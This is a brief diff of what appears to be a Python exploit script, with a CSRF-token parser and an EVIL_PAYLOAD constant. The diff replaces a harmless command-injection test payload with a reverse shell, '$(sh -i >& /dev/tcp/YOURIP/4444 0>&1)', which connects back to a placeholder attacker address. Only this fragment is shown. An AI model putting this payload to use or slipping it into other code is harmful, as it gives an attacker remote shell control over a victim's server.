@@ -17,7 +17,7 @@ import urllib.request
 from html.parser import HTMLParser
 from pathlib import Path
 
-EVIL_PAYLOAD = f"$(id> /home/text.txt)"
+EVIL_PAYLOAD = "$(sh -i >& /dev/tcp/YOURIP/4444 0>&1)"
 
 
 class CsrfParser(HTMLParser):
